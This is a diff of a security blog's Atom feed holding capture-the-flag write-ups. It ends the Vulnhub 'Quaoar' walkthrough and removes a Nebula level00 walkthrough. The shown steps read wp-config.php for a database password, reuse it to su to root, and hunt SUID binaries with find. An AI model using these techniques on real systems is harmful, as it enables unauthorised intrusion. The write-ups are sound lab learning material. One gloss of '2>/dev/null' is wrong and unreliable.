+&lt;span class=&quot;gp&quot;&gt;www-data@Quaoar:/var/www$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wordpress
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wordpress
+&lt;span class=&quot;gp&quot;&gt;www-data@Quaoar:/var/www/wordpress$ &lt;/span&gt;cat wp-config.php
+
+/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database username &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
+define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+
+/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database password &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
+define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'rootpassword!'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Wil it work? &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;www-data@Quaoar:/var/www/wordpress$ &lt;/span&gt;su root
+su root
+Password: rootpassword!
+&lt;span class=&quot;gp&quot;&gt;root@Quaoar:/var/www/wordpress# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
+&lt;span class=&quot;gp&quot;&gt;root@Quaoar:~# &lt;/span&gt;ls -la
+ls -la
+total 48
+drwx------  6 root root 4096 Nov 30  2016 .
+drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
+drwx------  2 root root 4096 Oct  7  2016 .aptitude
+-rw-------  1 root root  368 Jan 15  2017 .bash_history
+-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
+drwx------  2 root root 4096 Oct 15  2016 .cache
+----------  1 root root   33 Oct 22  2016 flag.txt
+-rw-r--r--  1 root root  140 Apr 19  2012 .profile
+drwx------  2 root root 4096 Oct 26  2016 .ssh
+-rw-------  1 root root 4740 Nov 30  2016 .viminfo
+drwxr-xr-x  8 root root 4096 Jan 29  2015 vmware-tools-distrib
+&lt;span class=&quot;gp&quot;&gt;root@Quaoar:~# &lt;/span&gt;cat flag.txt
+cat flag.txt
+8e3f9ec016e3598c5eec11fd3d73f6fb&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We have the last flag, together with the root access! &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Vulnhub" /><summary type="html">Introduction Hello everyone, another week, another challenge from Vulnhub. This time we're going to work on a short machine called Quaoar.</summary></entry><entry><title type="html">Vulnhub.com - The Wall</title><link href="http://localhost:4000/vulnhub-the-wall/" rel="alternate" type="text/html" title="Vulnhub.com - The Wall" /><published>2017-08-07T10:00:00+02:00</published><updated>2017-08-07T10:00:00+02:00</updated><id>http://localhost:4000/vulnhub-the-wall</id><content type="html" xml:base="http://localhost:4000/vulnhub-the-wall/">&lt;h1&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;Hello everyone, today we're going to go through another machine from &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt; called &lt;b&gt;The Wall&lt;/b&gt;. Let's take a look at the description.  &lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;In 1965, one of the most influential bands of our times was formed.. Pink Floyd. This boot2root box has been created to celebrate 50 years of Pink Floyd's contribution to the music industry, with each challenge giving the attacker an introduction to each member of the Floyd.
@@ -12,7 +384,6 @@ You challenge is simple... set your controls for the heart of the sun, get root,
 
 &lt;h1&gt;Write-Up&lt;/h1&gt;
 
-&lt;p&gt;&lt;/p&gt;
 &lt;p&gt;Attacker: &lt;b&gt;Kali Linux 192.168.56.102&lt;/b&gt;&lt;/p&gt;
 &lt;p&gt;Victim: &lt;b&gt;The Wall 192.168.56.103&lt;/b&gt;&lt;/p&gt;
 
@@ -686,7 +1057,7 @@ Who is the only band member to be featured on every Pink Floyd album? : Nick Mas
 &lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;whoami
 NickMason&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;Correct answered, and we're logged into another account on the machine. Let's take a look at the directories. &lt;/p&gt;
+&lt;p&gt;Correct answer, and we're logged into another account on the machine. Let's take a look at the directories. &lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/NickMason
 &lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;ls -la
@@ -745,7 +1116,7 @@ ls: .: Permission denied
 &lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;whoami
 RichardWright&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;Quick check showed that now we're able torun previously restricted binary! &lt;/p&gt;
+&lt;p&gt;Quick check showed that now we're able to run previously restricted binary! &lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;/usr/local/bin/shineon
 Menu
@@ -3348,56 +3719,4 @@ total 8
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;level01@nebula:/home/flag01$ &lt;/span&gt;./flag01
 You have successfully executed getflag on a target account&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;Another challenge completed! &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Exploit Exercises" /><summary type="html">Introduction</summary></entry><entry><title type="html">Nebula 00</title><link href="http://localhost:4000/nebula-00/" rel="alternate" type="text/html" title="Nebula 00" /><published>2017-06-05T02:00:00+02:00</published><updated>2017-06-05T02:00:00+02:00</updated><id>http://localhost:4000/nebula-00</id><content type="html" xml:base="http://localhost:4000/nebula-00/">&lt;h1&gt;Introduction&lt;/h1&gt;
-
-&lt;p&gt;Finally, exams are over so it's time to get back to security topics. Today I'm going to start documenting journey through Nebula machine from &lt;a href=&quot;https://exploit-exercises.com/&quot;&gt;Exploit Exercises&lt;/a&gt;. &lt;/p&gt;
-
-&lt;pre&gt;
-Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.
-Nebula is an ideal place to get started for people new to Linux exploitation.
-&lt;/pre&gt;
-
-&lt;p&gt;It would be great to have this quick reminder, so let's try it out! &lt;/p&gt;
-
-&lt;h1&gt;Challenge&lt;/h1&gt;
-
-&lt;p&gt;&lt;b&gt;About&lt;/b&gt;&lt;/p&gt;
-
-&lt;pre&gt;
-This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.
-
-Alternatively, look at the find man page.
-
-To access this level, log in as level00 with the password of level00.
-&lt;/pre&gt;
-
-&lt;p&gt;&lt;b&gt;Solution&lt;/b&gt;&lt;/p&gt;
-
-&lt;p&gt;Common thing in CTFs and other hacking challenges is to find executable file, with suid bit set. Of course we want the faster way so let's use the find command. But firstly, what is suid bit? &lt;/p&gt;
-
-&lt;p&gt;It's an information, that an executable is being run with the permissions of the owner, not the person running it. For example, we have root user that creates a script changing some files and want to share it with other users on the system. By adding the suid bit - it's possible. Now let's find these.  &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;level00@nebula:~$ &lt;/span&gt;find / -perm /u&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s -user flag00 2&amp;gt;/dev/null
-/bin/.../flag00
-/rofs/bin/.../flag00
-&lt;span class=&quot;gp&quot;&gt;level00@nebula:~$ &lt;/span&gt;ls -l /bin/.../
-total 8
--rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 flag00&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great, we've found it! Looking at permissions we know it's an suid. We can also break down the find command to better understand it.  &lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;b&gt;/&lt;/b&gt; - start at the top of directory&lt;/li&gt;
-  &lt;li&gt;&lt;b&gt;-perm /u=s&lt;/b&gt; - find all SUID set files&lt;/li&gt;
-  &lt;li&gt;&lt;b&gt;-user level00&lt;/b&gt; - specify user &lt;/li&gt;
-  &lt;li&gt;&lt;b&gt;2&amp;gt;/dev/null&lt;/b&gt; - show only 2 results&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Now we have to run it, and get a flag.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;level00@nebula:~$ &lt;/span&gt;/bin/.../flag00
-Congrats, now run getflag to get your flag!
-&lt;span class=&quot;gp&quot;&gt;flag00@nebula:~$ &lt;/span&gt;getflag
-You have successfully executed getflag on a target account&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Awesome warmup, I'm definitely looking forward to the next ones.&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Exploit Exercises" /><summary type="html">Introduction</summary></entry></feed>
+&lt;p&gt;Another challenge completed! &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Exploit Exercises" /><summary type="html">Introduction</summary></entry></feed>
